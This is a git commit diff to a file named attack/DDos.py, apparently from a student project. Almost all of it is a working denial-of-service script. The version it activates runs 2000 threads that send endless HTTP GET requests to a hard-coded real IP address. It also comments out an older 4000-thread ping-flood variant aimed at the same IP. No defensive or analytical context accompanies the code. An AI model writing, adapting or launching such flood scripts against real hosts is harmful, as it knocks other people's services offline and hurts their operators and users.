826336db55db7e664ec57cb0d87400626cf2b1d6
veerapat <veerapat.p66@rsu.ac.th>
2026-01-10 12:17:39 +0700

    Final

--- attack/DDos.py
+++ attack/DDos.py
@@ -1,45 +1,19 @@
-# import requests
-# import threading
-
-# target = "http://64.23.233.33"
-# num_threads = 2000
-
-# def attack():
-#     while True:
-#         try:
-#             r = requests.get(target)
-#             print(f"Status: {r.status_code}")
-#         except Exception as e:
-#             print(f"Error: {e}")
-
-# for i in range(num_threads):
-#     t = threading.Thread(target=attack)
-#     t.daemon = True
-#     t.start()
-# try:
-#     while True:
-#         pass
-# except KeyboardInterrupt:
-#     print("Stopping all threads...")
-# except KeyboardInterrupt:
-#     print("Stopping all threads...")
-
-# input("Press Enter to stop...\n")
-import os
+import requests
 import threading
 
-target = "64.23.233.33"   # กำหนด IP หรือ hostname
-num_threads = 4000       # จำนวนเธร็ดที่จะสร้าง
+target = "http://64.23.233.33"
+num_threads = 2000
 
-def ping():
+def attack():
     while True:
         try:
-            os.system(f"ping -c 1 {target}")
+            r = requests.get(target)
+            print(f"Status: {r.status_code}")
         except Exception as e:
             print(f"Error: {e}")
 
 for i in range(num_threads):
-    t = threading.Thread(target=ping)
+    t = threading.Thread(target=attack)
     t.daemon = True
     t.start()
 try:
@@ -47,3 +21,29 @@ try:
         pass
 except KeyboardInterrupt:
     print("Stopping all threads...")
+except KeyboardInterrupt:
+    print("Stopping all threads...")
+
+input("Press Enter to stop...\n")
+# import os
+# import threading
+
+# target = "64.23.233.33"   # กำหนด IP หรือ hostname
+# num_threads = 4000       # จำนวนเธร็ดที่จะสร้าง
+
+# def ping():
+#     while True:
+#         try:
+#             os.system(f"ping -c 1 {target}")
+#         except Exception as e:
+#             print(f"Error: {e}")
+
+# for i in range(num_threads):
+#     t = threading.Thread(target=ping)
+#     t.daemon = True
+#     t.start()
+# try:
+#     while True:
+#         pass
+# except KeyboardInterrupt:
+#     print("Stopping all threads...")
